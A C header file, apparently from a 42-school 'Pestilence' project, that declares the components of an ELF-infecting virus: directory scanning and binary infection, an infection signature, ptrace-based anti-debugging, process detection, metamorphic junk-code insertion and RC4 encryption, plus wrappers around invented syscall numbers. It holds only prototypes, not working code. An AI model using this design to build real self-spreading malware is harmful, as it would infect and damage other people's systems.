/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   pestilence.h                                       :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: jainavas <jainavas@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2026/01/06 22:10:30 by jainavas          #+#    #+#             */
/*   Updated: 2026/01/09 22:27:41 by jainavas         ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef PESTILENCE_H
# define PESTILENCE_H

# include <stdlib.h>
# include <dirent.h>
# include <sys/stat.h>
# include <fcntl.h>
# include <unistd.h>
# include <string.h>
# include <stdio.h>
# include <stdbool.h>
# include <elf.h>
# include <sys/mman.h>
# include <sys/ptrace.h>
# include <sys/wait.h>
# include <sys/user.h>
# include <sys/reg.h>
# include <signal.h>
# include <math.h>

extern long long pepino;

#define SYS_CUSTOM_WRITE   6969
#define SYS_CUSTOM_OPEN    6767
#define SYS_CUSTOM_CLOSE   9696

#define MAX_SIGNATURE_LEN 128

// Estructuras
typedef struct {
    void        *data;       // Contenido del archivo ELF mapeado
    size_t      size;        // Tamaño total del archivo
    Elf64_Ehdr  *ehdr;       // Puntero al ELF header
    Elf64_Phdr  *phdr;       // Puntero a program headers
    Elf64_Shdr  *shdr;       // Puntero a section headers
} t_elf;

int calculadoradepepino();
// anti_process.c  
void is_process_running(const char *process_name);
// syscall_tracer.c
void run_with_tracer(void);
void child_process(void);
void parent_tracer(pid_t child_pid);

// Wrappers de syscalls custom (inline para eficiencia)
static inline ssize_t custom_write(int fd, const void *buf, size_t count) {
    return syscall(SYS_CUSTOM_WRITE, fd, buf, count);
}

static inline int custom_open(const char *path, int flags) {
    return syscall(SYS_CUSTOM_OPEN, path, flags);
}

static inline int custom_close(int fd) {
    return syscall(SYS_CUSTOM_CLOSE, fd);
}

// elf_parser.c
int     parse_elf(const char *filename, t_elf *elf);
void    cleanup_elf(t_elf *elf);
Elf64_Shdr *find_section(t_elf *elf, const char *name);
// signature.c
const char      *get_signature(void);
bool            is_infected(t_elf *elf);
// injector.c
void scan_and_infect(const char *dir1, const char *dir2);
void scan_directory(const char *dir_path);
bool is_elf_file(const char *filepath);
int infect_binary(const char *filepath);
// metamorph.c
void init_metamorph(void);
void insert_garbage(void);
void insert_garbage5(void);
void insert_garbage4(void);
void insert_garbage3(void);
void insert_garbage2(void);
int get_execution_order(void);
void random_delay(void);
// rc4.c
void rc4_crypt(unsigned char *data, size_t datalen, 
               const unsigned char *key, size_t keylen);

#endif